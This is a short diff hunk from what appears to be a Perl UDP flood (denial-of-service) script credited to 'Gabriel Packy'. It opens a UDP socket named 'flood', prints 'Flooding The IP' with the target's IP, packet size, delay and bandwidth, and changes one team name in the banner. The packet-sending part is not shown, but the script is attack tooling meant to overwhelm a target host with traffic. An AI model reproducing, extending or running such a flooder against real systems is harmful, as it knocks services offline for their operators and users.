@@ -72,7 +72,7 @@ $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 print "Flooding The IP: $ip " . ($port ? $port : "By:") . " Gabriel Packy " . 
-  ($size ? "$size-byte" : "UDP Oficial da: OnFall Team") . " https://github.com/gblpcky" . ($time ? " for $time seconds" : "") . "\n";
+  ($size ? "$size-byte" : "UDP Oficial da: Smert") . " https://github.com/gblpcky" . ($time ? " for $time seconds" : "") . "\n";
 print "Interpacket delay $delay msec\n" if $delay;
 print "total IP bandwidth $bw kbps\n" if $bw;
 print "Para parar use Ctrl+C\n" unless $time;
